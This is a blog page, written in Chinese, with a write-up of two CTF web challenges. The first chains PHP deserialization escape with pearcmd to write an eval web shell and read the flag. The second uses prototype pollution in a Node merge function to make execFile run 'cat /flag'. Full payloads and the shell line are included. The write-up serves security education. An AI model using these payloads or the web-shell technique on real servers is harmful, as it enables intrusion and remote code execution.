@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>记两道强网拟态的web | Artone &#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://boooook123.github.io/Artone.github.io//favicon.ico?v=1668409090686">
+<link rel="stylesheet" href="https://boooook123.github.io/Artone.github.io//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="没能挺进决赛，但是稳稳苟住了前60，所以问题不大🤣
+
+ezus
+首先可以看到这一段源码
+&lt;?php
+include 'tm.php'; // Next step in tm.php
+if (preg_match('/tm\.php\..." />
+    <meta name="keywords" content="CTF,WEB" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://boooook123.github.io/Artone.github.io/">
+        <img src="https://boooook123.github.io/Artone.github.io//images/avatar.png?v=1668409090686" class="site-logo">
+        <h1 class="site-title">Artone &#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      一些细细的琐事。。
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://boooook123.github.io/Artone.github.io//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">记两道强网拟态的web</h2>
+            <div class="post-date">2022-11-08</div>
+            
+            <div class="post-content" v-pre>
+              <p>没能挺进决赛，但是稳稳苟住了前60，所以问题不大🤣</p>
+<!-- more -->
+<h2 id="ezus">ezus</h2>
+<p>首先可以看到这一段源码</p>
+<pre><code class="language-php">&lt;?php
+include 'tm.php'; // Next step in tm.php
+if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
+{
+    exit(&quot;no way!&quot;);
+}
+if (isset($_GET['source']))
+{
+    $path = basename($_SERVER['PHP_SELF']);
+    if (!preg_match('/tm.php$/', $path) &amp;&amp; !preg_match('/index.php$/', $path))
+    {
+        exit(&quot;nonono!&quot;);
+    }
+    highlight_file($path);
+    exit();
+}
+?&gt;
+&lt;a href=&quot;index.php?source&quot;&gt;source&lt;/a&gt;
+</code></pre>
+<p>直接绕过就行</p>
+<pre><code>http://172.52.4.193/index.php/tm.php/�?source
+</code></pre>
+<p>得到tm.php源码</p>
+<pre><code class="language-php">&lt;?php
+class UserAccount
+{
+    protected $username;
+    protected $password;
+ 
+    public function __construct($username, $password)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+}
+ 
+function object_sleep($str)
+{
+    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
+    return $ob;
+}
+ 
+function object_weakup($ob)
+{
+    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
+    return $r;
+}
+
+class order
+{
+    public $f;
+    public $hint;
+    
+    public function __construct($hint, $f)
+    {
+        $this-&gt;f = $f;
+        $this-&gt;hint = $hint;
+    }
+    
+    public function __wakeup()
+    {
+        //something in hint.php
+        if ($this-&gt;hint != &quot;pass&quot; || $this-&gt;f != &quot;pass&quot;) {
+            $this-&gt;hint = &quot;pass&quot;;
+            $this-&gt;f = &quot;pass&quot;;
+        }
+    }
+    
+    public function __destruct()
+    {
+        if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))
+        {
+            $r = parse_url($this-&gt;hint);
+            if (!empty($this-&gt;f)) {
+                if (strpos($this-&gt;f, &quot;try&quot;) !==  false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) {
+                    @include($this-&gt;f . '.php');
+                } else {
+                    die(&quot;try again!&quot;);
+                }
+                if (preg_match('/prankhub$/', $r['host'])) {
+                    @$out = file_get_contents($this-&gt;hint);
+                    echo &quot;&lt;br/&gt;&quot;.$out;
+                } else {
+                    die(&quot;&lt;br/&gt;error&quot;);
+                }
+            } else {
+                die(&quot;try it!&quot;);
+            }
+        }
+        else
+        {
+            echo &quot;Invalid URL&quot;;
+        }
+    }
+}
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$user = serialize(new UserAccount($username, $password));
+unserialize(object_weakup(object_sleep($user)))
+?&gt; 
+</code></pre>
+<p>存在反序列化的逃逸，目的是用UserAccount类去触发order类，也就是逃逸双引号，<br>
+让password=new order()</p>
+<p>payload：</p>
+<pre><code>username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Ftrypass%2Fread%3Dconvert.base64-encode%2Fresource%3Dhint%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
+</code></pre>
+<p>读一下hint.php</p>
+<pre><code class="language-php">&lt;?php
+echo &quot;This is the wrong way&quot;;
+$flag = &quot;you can find it in /f1111444449999.txt&quot;;
+?&gt;
+</code></pre>
+<p>尝试一下pearcmd，发现还真有，那么就可以直接写马了</p>
+<p>payload：</p>
+<pre><code>POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[1])?&gt;+3.php
+
+username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&amp;password=%22%3Bs%3A11%3A%22%00*%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A60%3A%22trypass%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd%22%3Bs%3A4%3A%22hint%22%3Bs%3A25%3A%220%3A%2F%2F172.52.4.86%2F%3Bprankhub%22%3B%7D%7D
+</code></pre>
+<p>getshell后读flag</p>
+<pre><code>(www-data:/var/www/html) $ cat /f1111444449999.txt
+flag{sMGbQqN7RTQwS6L0j9f5nytW1wWBAkWJ}
+</code></pre>
+<h2 id="whoyouare">WHOYOUARE</h2>
+<p>题目采用了fastify框架，主要的代码在user.js中</p>
+<pre><code class="language-javascript">const merge = require('../utils/merge')
+const bin = &quot;/bin/bash&quot;
+const ChildProcess = require('child_process');
+
+function checkUser(command){
+    if (Array.isArray(command) === false || command.length &gt; 2) {  //数组且长度小于等于2
+        return false;
+    }
+    for (let i = 0; i &lt; command.length; i++) {
+        let cmd = command[i];
+        if (typeof cmd !== 'string' || cmd.length &gt; 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) { //小于等于4的字符串
+            return false;
+        }
+    }
+    return true;
+}
+
+async function routes (fastify, options) {
+    fastify.route(
+        {
+            method: 'POST',
+            url: '/user',
+            schema: {
+                querystring: {
+                    user: { type: 'string' },
+                },
+                additionalProperties: false,
+                response: {
+                    200: {
+                        $ref: 'respWrapper#/response/success'
+                    }
+                }
+            },
+            preHandler: function (request, reply, done) {
+                //user init
+                request.user = {username : 'guest', command: [&quot;-c&quot;, &quot;id&quot;]}  //污染的目标
+                let user = JSON.parse(request.body.user)  //json里的user
+                // clean user command
+                if (checkUser(user.command) !== true) {   //cmd需要满足条件
+                    user.command = [&quot;-c&quot;, &quot;id&quot;]
+                }
+                try {
+                    merge(request.user, user)
+                }catch (e){
+                    reply.code(400).send({status: 1, info: &quot;Something error&quot;})
+                    return ;
+                }
+                done()
+            },
+            handler : function (request, reply) {
+                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) =&gt; {   //命令执行
+                    if (error) {
+                        reply.code(400).send({status: 1, info: error})
+                    }
+                    reply.code(200).send({ status : 0 , info : `User of ${request.user.username} : ${stdout}`});
+                });
+            }
+        })
+    fastify.route({
+        method: 'GET',
+        url: '/',
+        response: {
+            $ref: 'respWrapper#/response/success'
+        },
+        handler: function (request, reply) {
+            reply.send({ status: 0, info: 'go user' })
+        }
+    })
+}
+
+module.exports = routes
+</code></pre>
+<p>首先是两个路由，GET访问则会提示我们去访问user</p>
+<p>接下来就是POST访问/user，可以看到它会接受json数据，但我们发现只有requset.user中的cmd才会被执行，所以我们的目的就是想办法污染request.user对象，我们可控的是user对象，以及里面的command属性</p>
+<p>与此同时，这两个对象还有一个merge函数相连，这就为原型链污染创造了机会</p>
+<pre><code>{&quot;user&quot;:{&quot;__proto__&quot;:{&quot;command&quot;:[&quot;-c&quot;, &quot;cat /flag&quot;]}}}
+</code></pre>
+<p><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888886359.png" alt="" loading="lazy"><br>
+但是非常遗憾的是<code>__proto___</code>被过滤了，但是constructor以及prototype都没有被过滤，由于merge的递归功能，我们可以用constructor.prototype去指向user的原型</p>
+<pre><code>{&quot;user&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;1&quot;,&quot;cat /flag&quot;}，&quot;command&quot;:[&quot;-c&quot;],}}}
+</code></pre>
+<p>这个json被递归后，Object对象中会被写入属性</p>
+<pre><code>&quot;1&quot;:&quot;cat /flag&quot;
+</code></pre>
+<p>在合并command属性时，由于user中的command数组只有一个值，而request.user中的command数组有两个值，所以递归过程中会出现(source是user，target是request.user)</p>
+<pre><code class="language-javascript">const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
+
+const merge = (target, source) =&gt; {
+    for (const key in source) {
+        if(!whileTypes.includes(typeof source[key]) &amp;&amp; !whileTypes.includes(typeof target[key])){
+            if(key !== '__proto__'){
+                merge(target[key], source[key]);
+            }
+        }else{
+            target[key] = source[key];
+        }
+    }
+}
+</code></pre>
+<p>source[1]不存在而target[1]=id，于是乎就会自动从原型中寻找是否有合适的值，对于数组来说，</p>
+<p><code>&quot;1&quot;:&quot;cat /flag&quot;</code>就是array[1]=&quot;cat /flag&quot;</p>
+<p>于是source就从它的原型中继承了这个键值对，</p>
+<p>然后target[key] = source[key] 就把id篡改成了cat /flag</p>
+<figure data-type="image" tabindex="1"><img src="https://boooook123.github.io/Artone.github.io//post-images/1667888849256.png" alt="" loading="lazy"></figure>
+<p>final payload：</p>
+<pre><code>{&quot;user&quot;:\&quot;constructor\&quot;:{\&quot;prototype\&quot;: {\&quot;1\&quot;: \&quot;cat /flag\&quot;,&quot;{\&quot;command\&quot;:[\&quot;-c\&quot;]}}}&quot;}
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/gh05R7cM0/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/3cJUATMNRB/" class="tag">
+                    WEB
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://boooook123.github.io/Artone.github.io/post/vscodephpstudy-dong-tai-diao-shi-huan-jing/">
+                  <h3 class="post-title">
+                    vscode+phpstudy动态调试环境
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
